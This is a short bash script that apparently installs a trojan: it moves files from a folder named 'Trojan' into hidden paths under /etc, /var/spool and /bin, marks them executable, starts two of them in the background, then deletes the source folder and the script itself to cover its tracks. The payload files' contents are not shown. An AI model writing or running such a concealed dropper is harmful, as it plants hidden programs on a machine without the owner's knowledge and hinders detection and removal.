#!/bin/bash
mkdir /etc/.music
mv /etc/.a/Trojan/skyrim.py /etc/.music/.skyrim.py
chmod +x /etc/.music/.skyrim.py
mv /etc/.a/Trojan/log.sh /var/spool/.log.sh
chmod +x /var/spool/.log.sh
mv /etc/.a/Trojan/systemm.sh /bin/.systemm.sh
chmod +x /bin/.systemm.sh
bash /bin/.systemm.sh &
mv /etc/.a/Trojan/resolver.sh /etc/.resolver.sh
chmod +x /etc/.resolver.sh
bash /etc/.resolver.sh &
echo Installation complete.
rm -rf /etc/.a/Trojan
rm -- "$0"